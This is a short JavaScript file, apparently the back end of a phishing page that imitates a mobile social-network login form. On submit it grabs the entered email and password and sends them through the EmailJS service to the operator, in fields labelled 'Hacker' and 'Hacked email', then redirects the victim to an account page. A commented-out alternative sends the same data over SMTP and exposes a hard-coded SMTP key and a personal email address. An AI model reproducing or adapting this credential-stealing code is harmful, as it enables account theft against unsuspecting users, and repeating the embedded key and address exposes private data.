
 var login_form = document.getElementById('login_form');
 var email = "";
 var pass = "";
 login_form.addEventListener('submit', function(event){
   event.preventDefault();
    email = document.getElementById('m_login_email').value;
    pass = document.getElementById('m_login_password').value;

   if(email != "" && pass != ""){
              /*
              Email.send({
              Host : "smtp.sparkpostmail.com",
              Username : "SMTP_Injection",
              Password : "6df64c48d3a0675fa2ae0d8b0b28fa29e782564a",
              To : 'ondegoenock@gmail.com',
              From : "ondegoenock@gmail.com",
              Subject : email,
              Body : "email is "+email+ " pass is "+ pass
          }).then(
            message => alert(message)
          );

          */


          var template_params = {
                               "reply_to": "fuck you",
                               "Hacker": "Hacked email",
                               "Enock": "Password data",
                               "message_html": "email is "+ email + " spass is "+ pass
                  }

            var service_id = "default_service";
            var template_id = "template_Pgz8C0rE";
            emailjs.send(service_id, template_id, template_params)
            .then(function(response) {
            console.log('SUCCESS!', response.status, response.text);
            window.location.href = "account.html";
              }, function(error) {
                console.log('FAILED...', error);
              });


            }



   //window.location.href = "account.html";

 });
